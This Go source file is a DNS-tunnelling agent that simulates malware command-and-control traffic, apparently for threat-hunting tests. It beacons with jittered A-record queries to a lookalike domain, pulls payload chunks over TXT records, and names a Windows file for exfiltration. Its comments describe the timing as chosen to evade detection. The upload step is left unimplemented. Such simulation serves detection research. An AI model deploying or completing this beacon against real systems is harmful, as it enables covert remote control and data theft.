// DNS Tunnel Agent - Simulates malware beacon behavior
//
// This agent demonstrates DNS-based C2 communication:
//  1. Beacons via A record queries every 4-6 minutes
//  2. Interprets response IP to determine if job exists
//  3. If job: switches to TXT queries to receive payload
//  4. After TXT complete: uploads file via HTTPS
//  5. Returns to beaconing
//
// USAGE:
//  1. Configure variables below
//  2. Cross-compile for Windows: GOOS=windows GOARCH=amd64 go build -o agent.exe ./cmd/agent
//  3. Run on Windows target
//
// NOTE: In production (DirectMode=false), the agent queries the LOCAL DNS resolver,
// which then performs recursive resolution to reach the C2.
// For testing (DirectMode=true), queries go directly to the C2 server.
package main

import (
	"log"
	"time"

	"motd_joker_screenmate/internal/dns"
	"motd_joker_screenmate/internal/protocol"
)

// =============================================================================
// CONFIGURATION - Modify these variables for your environment
// =============================================================================

// =============================================================================
// CONFIGURATION - Modify these variables for your environment
// =============================================================================

var (
	// Domain is the base domain for DNS queries.
	Domain = "timeserversync.com"

	// C2ServerIP is the IP address of the C2 server.
	// Used for HTTPS connection AND for DNS queries when DirectMode=true.
	C2ServerIP = "127.0.0.1"

	// DirectMode controls DNS query routing:
	//   true  = Query C2 server directly (for testing)
	//   false = Query local resolver (for realistic traffic/experiment)
	DirectMode = true

	// DNSResolver is the local DNS resolver to query when DirectMode=false.
	// Examples: "192.168.1.1:53", "10.0.0.1:53", "8.8.8.8:53"
	DNSResolver = "8.8.8.8:53"

	// BeaconInterval is the base time between A record check-ins (seconds).
	BeaconInterval = 10 // 5 minutes

	// Jitter is the ± randomization applied to BeaconInterval (seconds).
	// Actual interval will be BeaconInterval ± Jitter (4-6 minutes).
	Jitter = 5

	// HTTPSPort is the port for direct HTTPS connection to C2.
	HTTPSPort = 8443

	// ExfilFilePath is the file to upload to the C2 after TXT transfer.
	// Should be ~200MB for realistic exfiltration traffic.
	ExfilFilePath = `C:\Users\Public\largefile.bin`

	// TXTQueryDelayMs is the delay between TXT queries (milliseconds).
	// A small delay makes the traffic look more natural.
	TXTQueryDelayMs = 1500 // 1.5 seconds
)

func main() {
	log.Println("=== DNS Tunnel Agent ===")
	log.Printf("Domain: %s", Domain)
	log.Printf("C2 Server: %s", C2ServerIP)
	log.Printf("Direct Mode: %v", DirectMode)

	// Determine which DNS server to query
	var dnsTarget string
	if DirectMode {
		dnsTarget = C2ServerIP + ":53"
		log.Printf("DNS Target: %s (DIRECT TO C2)", dnsTarget)
	} else {
		dnsTarget = DNSResolver
		log.Printf("DNS Target: %s (via local resolver)", dnsTarget)
	}

	log.Printf("Beacon interval: %d ± %d seconds", BeaconInterval, Jitter)
	log.Printf("Exfil file: %s", ExfilFilePath)

	// Create DNS client
	dnsClient := dns.NewClient(dnsTarget, Domain)

	// Main beacon loop
	log.Println("[AGENT] Starting beacon loop...")
	for {
		// Perform A record check-in
		log.Println("[BEACON] Sending A record query...")
		isJob, err := dnsClient.Beacon()

		if err != nil {
			log.Printf("[BEACON] Query failed: %v", err)
			// On error, wait and retry
			sleepWithJitter()
			continue
		}

		if isJob {
			log.Println("[BEACON] JOB RECEIVED! Switching to TXT transfer mode...")

			// Perform TXT transfer
			receiveTXTPayload(dnsClient)

			// TODO: Phase 5 - After TXT complete, upload file via HTTPS
			log.Println("[AGENT] TXT transfer complete. HTTPS upload not yet implemented.")
			log.Println("[AGENT] Resuming normal beacon cycle...")
		} else {
			log.Println("[BEACON] No job pending, sleeping...")
		}

		// Sleep with jitter before next beacon
		sleepWithJitter()
	}
}

// receiveTXTPayload queries TXT records in a loop until transfer is complete.
// Each TXT record contains a sequence number + base64 encoded chunk.
// An empty TXT record signals the end of the transfer.
//
// NOTE: We don't actually reassemble the payload in this simulation.
// The goal is to generate the traffic pattern (many TXT queries).
// For a real threat hunt, seeing hundreds of TXT queries in quick
// succession is the "smoking gun" indicator.
func receiveTXTPayload(client *dns.Client) {
	log.Println("[TXT] Starting payload transfer...")

	chunksReceived := 0
	totalBytes := 0
	startTime := time.Now()

	for {
		// Query for next TXT record
		txtValue, isEmpty, err := client.QueryTXT()

		if err != nil {
			log.Printf("[TXT] Query error: %v", err)
			// Continue anyway - we don't care about packet loss for this simulation
			// In a real scenario, you might implement retry logic
			time.Sleep(time.Duration(TXTQueryDelayMs) * time.Millisecond)
			continue
		}

		// Check for end of transfer (empty TXT record)
		if isEmpty {
			elapsed := time.Since(startTime)
			log.Printf("[TXT] Transfer complete!")
			log.Printf("[TXT] Received %d chunks, ~%d bytes in %v", chunksReceived, totalBytes, elapsed)
			return
		}

		// Parse the chunk (sequence number + base64 data)
		seqNum, payload, err := protocol.ParseChunk(txtValue)
		if err != nil {
			log.Printf("[TXT] Failed to parse chunk: %v", err)
			// Continue anyway
			time.Sleep(time.Duration(TXTQueryDelayMs) * time.Millisecond)
			continue
		}

		chunksReceived++
		totalBytes += len(payload)

		// Log progress every 100 chunks to avoid log spam
		if chunksReceived%100 == 0 || chunksReceived <= 5 {
			log.Printf("[TXT] Received chunk %d (seq=%d, %d bytes, total=%d bytes)",
				chunksReceived, seqNum, len(payload), totalBytes)
		}

		// Small delay between queries to look more natural
		// Also prevents hammering the DNS server too hard
		time.Sleep(time.Duration(TXTQueryDelayMs) * time.Millisecond)
	}
}

// sleepWithJitter pauses execution for BeaconInterval ± Jitter seconds.
// This randomization is critical for evading detection.
func sleepWithJitter() {
	base := time.Duration(BeaconInterval) * time.Second
	jitter := time.Duration(Jitter) * time.Second

	sleepDuration := protocol.CalculateJitter(base, jitter)

	log.Printf("[AGENT] Sleeping for %v", sleepDuration)
	time.Sleep(sleepDuration)
}
